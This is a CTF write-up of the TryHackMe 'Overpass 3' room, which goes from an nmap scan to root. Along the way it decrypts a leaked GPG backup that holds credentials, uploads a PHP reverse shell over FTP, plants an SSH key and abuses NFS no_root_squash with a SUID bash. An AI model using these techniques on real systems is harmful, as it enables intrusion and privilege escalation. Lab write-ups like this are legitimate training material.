# Overpass 3 - Hosting

---

Platform: Tryhackme

Difficulty: Medium

Date: 08/07/2025

Status: Rooted

---

Nmap scan:

```bash
┌──(ghost㉿kali)-[~/tryhackme/overpass-3]
└─$ sudo nmap -Pn -O -sC -A -p- --min-rate=3000 10.10.127.168 -oN nmap.full
[sudo] password for ghost: 
Starting Nmap 7.95 ( https://nmap.org ) at 2025-07-08 08:47 EDT
Nmap scan report for 10.10.127.168
Host is up (0.18s latency).
Not shown: 65482 filtered tcp ports (no-response), 50 filtered tcp ports (admin-prohibited)
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
22/tcp open  ssh     OpenSSH 8.0 (protocol 2.0)
| ssh-hostkey: 
|   3072 de:5b:0e:b5:40:aa:43:4d:2a:83:31:14:20:77:9c:a1 (RSA)
|   256 f4:b5:a6:60:f4:d1:bf:e2:85:2e:2e:7e:5f:4c:ce:38 (ECDSA)
|_  256 29:e6:61:09:ed:8a:88:2b:55:74:f2:b7:33:ae:df:c8 (ED25519)
80/tcp open  http    Apache httpd 2.4.37 ((centos))
|_http-title: Overpass Hosting
|_http-server-header: Apache/2.4.37 (centos)
| http-methods: 
|_  Potentially risky methods: TRACE
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Aggressive OS guesses: Linux 4.4 (91%), Linux 5.4 (91%), Android 9 - 10 (Linux 4.9 - 4.14) (91%), Linux 2.6.32 - 3.13 (91%), Linux 3.10 - 4.11 (91%), Linux 3.2 - 4.14 (91%), Linux 4.15 (91%), Linux 4.15 - 5.19 (91%), Linux 2.6.32 - 3.10 (91%), Linux 3.10 - 3.13 (90%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 5 hops
Service Info: OS: Unix
```

- Port 21: ftp vsftpd 3.0.3
- Port 22: ssh OpenSSH 8.0 (protocol 2.0)
- Port 80: http Apache httpd 2.4.37 ((centos))

### Port 80:

![image](https://github.com/user-attachments/assets/11160c4e-de92-4105-9bf3-c14cf085bf99)

Just a index page there, nothing of our interest.

While directory fuzzing, found a /backups endpoint, so checked that and there was a file named backup.zip. Download it and unzip it.

```bash
┌──(ghost㉿kali)-[~/tryhackme/overpass-3]
└─$ ffuf -u http://10.10.52.206/FUZZ -c -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -ic
....
backups                 [Status: 301, Size: 236, Words: 14, Lines: 8, Duration: 181ms]
```

![image 1](https://github.com/user-attachments/assets/56a502c3-fd5f-4ae5-8843-da2094958b9d)

```bash
┌──(ghost㉿kali)-[~/tryhackme/overpass-3]
└─$ unzip backup.zip 
Archive:  backup.zip
extracting: CustomerDetails.xlsx.gpg
inflating: priv.key
```

After extracting there was 2 files 1. CustomerDetails.xlsx 2. priv.key

Basically a pgp encrypted file and key to decrypt is also there , so let’s decrypt it.

```bash
┌──(ghost㉿kali)-[~/tryhackme/overpass-3]
└─$ gpg --import priv.key
┌──(ghost㉿kali)-[~/tryhackme/overpass-3]
└─$ gpg --output CustomerDetails.xlsx --decrypt CustomerDetails.xlsx.gpg
gpg: encrypted with rsa2048 key, ID 9E86A1C63FB96335, created 2020-11-08
      "Paradox <paradox@overpass.thm>"
gpg: Note: secret key 9E86A1C63FB96335 expired at Tue 08 Nov 2022 04:14:31 PM EST
```

We can read that CustomerDetails.xlsx file now, and here are some credentials of users. We can try them on ftp which we found open while nmap scanning.

![image 2](https://github.com/user-attachments/assets/f20e85dd-3146-4852-aaa3-c4ebbee9f2c9)

We were able to log in to ftp with paradox user’s credentials and as we can see this directory was the same that were hosted on port 80 http server.

So, we can just put our php-reverse-shell (pentest monkey) here via ftp put command and will trigger that shell via browser.

`http://machineIP/shell.php`

```bash
┌──(ghost㉿kali)-[~/tryhackme/overpass-3]
└─$ ftp 10.10.127.134
Connected to 10.10.127.134.
220 (vsFTPd 3.0.3)
Name (10.10.127.134:ghost): paradox
331 Please specify the password.
Password: 
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls
229 Entering Extended Passive Mode (|||37200|)
150 Here comes the directory listing.
drwxr-xr-x    2 48       48             24 Nov 08  2020 backups
-rw-r--r--    1 0        0           65591 Nov 17  2020 hallway.jpg
-rw-r--r--    1 0        0            1770 Nov 17  2020 index.html
-rw-r--r--    1 0        0             576 Nov 17  2020 main.css
-rw-r--r--    1 0        0            2511 Nov 17  2020 overpass.svg
put 226 Directory send OK.
ftp> put shell.php
local: shell.php remote: shell.php
229 Entering Extended Passive Mode (|||31739|)
150 Ok to send data.
100% |******************************************************************************************|  5494      134.34 MiB/s    00:00 ETA
226 Transfer complete.
5494 bytes sent in 00:00 (14.43 KiB/s)
```

Setup your netcat to listening mode, and as we trigger that shell via browser and we should get our reverse shell back.

```bash
┌──(ghost㉿kali)-[~/tryhackme/overpass-3]
└─$ rlwrap -f . -r nc -nvlp 4445
listening on [any] 4445 ...
connect to [10.17.87.131] from (UNKNOWN) [10.10.127.168] 44698
Linux ip-10-10-127-168 4.18.0-193.el8.x86_64 #1 SMP Fri May 8 10:59:10 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux
 14:16:54 up 32 min,  0 users,  load average: 0.00, 0.00, 0.02
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=48(apache) gid=48(apache) groups=48(apache)
sh: cannot set terminal process group (870): Inappropriate ioctl for device
sh: no job control in this shell
sh-4.4$ id
id
uid=48(apache) gid=48(apache) groups=48(apache)
sh-4.4$ find / -name *.flag 2>/dev/null
/usr/share/httpd/web.flag
sh-4.4$ cat /usr/share/httpd/web.flag
thm{0ae72f7870c36....REDACTED}
```

Two users exists in this mahcine 1. paradox 2. james

```bash
sh-4.4$ cd /home
cd /home
sh-4.4$ ls -la
ls -la
total 0
drwxr-xr-x.  4 root    root     34 Nov  8  2020 .
drwxr-xr-x. 17 root    root    244 Nov 18  2020 ..
drwx------.  3 james   james   112 Nov 17  2020 james
drwx------.  4 paradox paradox 203 Nov 18  2020 paradox
```

---

### Shell as Paradox

We can log into user paradox with that same credentials we got earlier.

```bash
sh-4.4$ su paradox
su paradox
Password: ShibesAreGreat123
id
uid=1001(paradox) gid=1001(paradox) groups=1001(paradox)
python3 -c 'import pty;pty.spawn("/bin/bash")'
[paradox@ip-10-10-127-168 /]$ id
id
uid=1001(paradox) gid=1001(paradox) groups=1001(paradox)
```

ok, now we just have to upgrade this shell, so we can generate a rsa key pair and will copy our public key to paradox’s authorised keys. Then we will be able to ssh to paradox.

```bash
┌──(ghost㉿kali)-[~/tryhackme/overpass-3]
└─$ ssh-keygen -t rsa -f paradox
Generating public/private rsa key pair.
Enter passphrase for "paradox" (empty for no passphrase): 
Enter same passphrase again: 
Your identification has been saved in paradox
Your public key has been saved in paradox.pub
The key fingerprint is:
SHA256:i9axD3G5Gbtllk3JmfusX0TEZufplympruhnO56nkC4 ghost@kali
The key's randomart image is:
+---[RSA 3072]----+
|               ..|
|               .=|
|               ++|
|           . . *.|
|        S +   O +|
|       o.* = * *.|
|      oo= + * + o|
|     E. o*.B   o.|
|      o++*X.  .o+|
+----[SHA256]-----+
```

![image 3](https://github.com/user-attachments/assets/9e48234a-6804-4e5a-82e5-0fc86fdf21e7)

Now, copy that public key from [paradox.pub](http://paradox.pub) and paste that in paradox’s authorized keys.

```bash
[paradox@ip-10-10-127-134]$ echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDWr+WXsehbD5Y8FuynF7wSZvPvcd0H/gn8x3N4IiNqrH93MNCw8bdZe4mYaCcxo91posVFS7+Xyn2otNfN8/dWNop3+ngj1XD3u1Jeism8EcNLQRK+B+cZbH37zvREcQY6dqRh4+lvARlzLNyF1SUmzwHMW04wvn1Jqes5rqW5ddQzCVvQsFsGrzTxeNCtAjLw19oFzwR+3J8NlAX8pvmEC1a24dKkslvw9qzJFGHxrSNpDAmetfFyymuHNtMfwAESEY/iVK1Lwq+1tydezkeVpaLjbsbNpg/P0LpwcvPdABnu3ct6sgAReJ2xqAIkkA+lKqRmA2h8Xa1SyA7FBc5/kY7eZ1C6QXp9FFd8Ov67ubtPAxFudopTydm/qiyVu7OT5H7QKOJiQNy2J7l8jCiX3kfXzSrkC5K0/Sq8lSHr1PmvyVBAbFItDBbuTQOF1BBZM4OOzw4cf5U9OpCwR93bQgU7HcijiZjcpH8dvMw74DGBclFqFgwpb6+2D/Pg6G0= ghost@kali" > /home/paradox/.ssh/authorized_keys
```

We can now able to ssh to paradox with that private key.

```bash
┌──(ghost㉿kali)-[~/tryhackme/overpass-3]
└─$ ssh -i paradox paradox@10.10.127.134
The authenticity of host '10.10.127.134 (10.10.127.134)' can't be established.
ED25519 key fingerprint is SHA256:18WMJxDadr79jI/eHKaMMLgRKWSOMUxtNLFbBJjVKrg.
This host key is known by the following other names/addresses:
    ~/.ssh/known_hosts:18: [hashed name]
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.127.134' (ED25519) to the list of known hosts.
Last login: Tue Jul  8 15:19:30 2025
[paradox@ip-10-10-127-134 ~]$
```

---

### Shell as James

We can see a NFS share is hosted by the server, i.e. home directory of user james and **no_root_squash** is enabled. It means that if the share is mounted on our local device and if we create a file using root user, the file permissions also remain same for the remote server too.

```bash
[paradox@ip-10-10-52-206 ~]$ cat /etc/exports
/home/james *(rw,fsid=0,sync,no_root_squash,insecure)
```

Let’s check if we can mount that on our machine.

```bash
┌──(ghost㉿kali)-[~/tryhackme/overpass-3]
└─$ showmount -e 10.10.52.206                                              
clnt_create: RPC: Unable to receive
```

It means it was running on any internal port, which was not exposed outside. By default the port for nfs is 2049, but we can confirm it by running `ss -ltn`(alternative for netstat).

```bash
[paradox@ip-10-10-52-206 ~]$ ss -ltn
State             Recv-Q            Send-Q                       Local Address:Port                        Peer Address:Port           
LISTEN            0                 128                                0.0.0.0:111                              0.0.0.0:*              
LISTEN            0                 128                                0.0.0.0:20048                            0.0.0.0:*              
LISTEN            0                 128                                0.0.0.0:22                               0.0.0.0:*              
LISTEN            0                 64                                 0.0.0.0:36795                            0.0.0.0:*              
LISTEN            0                 64                                 0.0.0.0:2049                             0.0.0.0:*              
LISTEN            0                 128                                0.0.0.0:41221                            0.0.0.0:*              
```

Results, show that port 2049 is open for all interfaces(0.0.0.0), but why didn’t nmap able to capture that and we also didn’t able to connect to it when we tried. So, there maybe some firewall behind it. So, let’s forward this port via ssh.

```bash
──(ghost㉿kali)-[~/tryhackme/overpass-3]
└─$ ssh -i paradox -L 2049:127.0.0.1:2049 paradox@10.10.52.206
Last login: Wed Jul  9 11:21:55 2025 from 10.17.87.131
[paradox@ip-10-10-52-206 ~]$ 
```

Now, we can mount the nfs shares locally. I mounted them on /tmp/overpass, you can also create that directory or any other you wanna mount to.

```bash
┌──(ghost㉿kali)-[/tryhackme/overpass-3]
└─$ sudo mount -t nfs -o port=2049 localhost:/ /tmp/overpass
[sudo] password for ghost: 

┌──(ghost㉿kali)-[/]
└─$ cd /tmp/overpass                                                                                                                     
┌──(ghost㉿kali)-[/tmp/overpass]
└─$ ls -la
total 16
drwx------  3 ghost kali 112 Nov 17  2020 .
drwxrwxrwt 18 root  root 420 Jul  9 06:30 ..
lrwxrwxrwx  1 root  root   9 Nov  8  2020 .bash_history -> /dev/null
-rw-r--r--  1 ghost kali  18 Nov  8  2019 .bash_logout
-rw-r--r--  1 ghost kali 141 Nov  8  2019 .bash_profile
-rw-r--r--  1 ghost kali 312 Nov  8  2019 .bashrc
drwx------  2 ghost kali  61 Nov  7  2020 .ssh
-rw-------  1 ghost kali  38 Nov 17  2020 user.flag

┌──(ghost㉿kali)-[/tmp/overpass]
└─$ cat user.flag  
thm{3693fc86661f.......REDACTED}
```

We have successfully mounted james home directory.

With `/ssh/id_rsa` , we can now ssh to james also.

```bash
┌──(ghost㉿kali)-[/tmp/overpass]
└─$ cd .ssh    
                                                                                                                                       
┌──(ghost㉿kali)-[/tmp/overpass/.ssh]
└─$ ls    
authorized_keys  id_rsa  id_rsa.pub
                                                                                                                                       
┌──(ghost㉿kali)-[/tmp/overpass/.ssh]
└─$ ssh -i id_rsa james@10.10.52.206  
Last login: Wed Nov 18 18:26:00 2020 from 192.168.170.145
[james@ip-10-10-52-206 ~]$ id
uid=1000(james) gid=1000(james) groups=1000(james)
```

---

### Shell as root

We are now ready to exploit the `no_root_squash` vulnerability.
First of all copy /bin/bash to user james home directory in target machine.[You can also copy that bash file from your own machine, but when i tried it throws me an error with some library mis-matching, so it’s better to copy that from target machine]

```bash
[james@ip-10-10-52-206 ~]$ cp /bin/bash .
[james@ip-10-10-52-206 ~]$ ls
bash  user.flag
```

Now, we can change its ownership and permissions via mounted folder on our machine.

```bash
┌──(ghost㉿kali)-[/tmp/overpass]
└─$ sudo chown root:root bash
      
┌──(ghost㉿kali)-[/tmp/overpass]
└─$ sudo chmod 4777 bash
```

All done!, now we are all set to be root.

Now, just have to execute bash from target machine and we will be root and will grab root’S flag.

```bash
[james@ip-10-10-52-206 ~]$ ./bash -p
bash-4.4# id
uid=1000(james) gid=1000(james) euid=0(root) groups=1000(james)
bash-4.4# cd /root
bash-4.4# ls -la
total 24
dr-x------.  3 root root 141 Nov 17  2020 .
drwxr-xr-x. 17 root root 244 Nov 18  2020 ..
lrwxrwxrwx.  1 root root   9 Nov  8  2020 .bash_history -> /dev/null
-rw-------.  1 root root  18 May 11  2019 .bash_logout
-rw-------.  1 root root 176 May 11  2019 .bash_profile
-rw-------.  1 root root 176 May 11  2019 .bashrc
-rw-------.  1 root root 100 May 11  2019 .cshrc
-rw-------.  1 root root  38 Nov 17  2020 root.flag
drwxr-xr-x   2 root root  29 Nov 17  2020 .ssh
-rw-------.  1 root root 129 May 11  2019 .tcshrc
bash-4.4# cat root.flag
thm{a4f6adb70371a4.........REDACTED}
```

That’s it for this machine.✅
